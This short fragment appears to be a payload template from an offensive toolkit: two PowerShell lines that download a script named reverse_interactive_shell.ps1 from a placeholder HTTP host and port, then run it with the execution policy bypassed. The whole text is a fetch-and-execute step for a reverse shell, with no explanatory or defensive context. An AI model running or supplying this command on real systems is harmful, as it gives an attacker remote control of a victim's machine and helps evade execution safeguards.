iwr -Uri "http://${http_ip}:${http_port}/reverse_interactive_shell.ps1" -OutFile "reverse_interactive_shell.ps1";
powershell -ep bypass ./reverse_interactive_shell.ps1;
